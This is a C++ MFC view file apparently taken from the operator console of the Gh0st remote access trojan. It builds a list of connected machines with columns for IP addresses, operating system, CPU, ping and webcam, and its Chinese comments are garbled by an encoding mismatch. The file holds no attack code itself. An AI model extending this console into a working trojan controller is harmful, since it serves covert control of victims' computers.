
// Gh0stView.cpp : CGh0stView ���ʵ��
//

#include "stdafx.h"
// SHARED_HANDLERS ������ʵ��Ԥ��������ͼ������ɸѡ�������
// ATL ��Ŀ�н��ж��壬�����������Ŀ�����ĵ����롣
#ifndef SHARED_HANDLERS
#include "Gh0st.h"
#endif

#include "Gh0stDoc.h"
#include "Gh0stView.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif

typedef struct  
{
	char *title;
	int nWidth;
}COLUMNSTRUCT;

COLUMNSTRUCT g_Column_Data[] = 
{
	{"ID",48},
	{"WAN",102},
	{"LAN",102},
	{"�������/��ע",107},
	{"����ϵͳ",128},
	{"CPU",55},
	{"Ping",40},
	{"����ͷ",51},
	{"����",100}
};

int g_Column_Width = 0;
int g_Column_Count = (sizeof(g_Column_Data) / 8);
// CGh0stView

IMPLEMENT_DYNCREATE(CGh0stView, CListView)

BEGIN_MESSAGE_MAP(CGh0stView, CListView)
END_MESSAGE_MAP()

// CGh0stView ����/����

CGh0stView::CGh0stView()
{
	// TODO: �ڴ˴���ӹ������

}

CGh0stView::~CGh0stView()
{
}

BOOL CGh0stView::PreCreateWindow(CREATESTRUCT& cs)
{
	// TODO: �ڴ˴�ͨ���޸�
	//  CREATESTRUCT cs ���޸Ĵ��������ʽ
	cs.style |= LVS_REPORT;
	return CListView::PreCreateWindow(cs);
}

void CGh0stView::OnInitialUpdate()
{
	CListView::OnInitialUpdate();
	m_pListCtrl = &GetListCtrl();
	m_pListCtrl->SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT);
	// TODO: ���� GetListCtrl() ֱ�ӷ��� ListView ���б�ؼ���
	//  �Ӷ������������ ListView��

		for (int i=0;i < g_Column_Count;i++)
		{
			m_pListCtrl->InsertColumn(i, g_Column_Data[i].title);
			m_pListCtrl->SetColumnWidth(i, g_Column_Data[i].nWidth);
			g_Column_Width += g_Column_Data[i].nWidth;
		}

}


// CGh0stView ���

#ifdef _DEBUG
void CGh0stView::AssertValid() const
{
	CListView::AssertValid();
}

void CGh0stView::Dump(CDumpContext& dc) const
{
	CListView::Dump(dc);
}

CGh0stDoc* CGh0stView::GetDocument() const // �ǵ��԰汾��������
{
	ASSERT(m_pDocument->IsKindOf(RUNTIME_CLASS(CGh0stDoc)));
	return (CGh0stDoc*)m_pDocument;
}
#endif //_DEBUG


// CGh0stView ��Ϣ�������
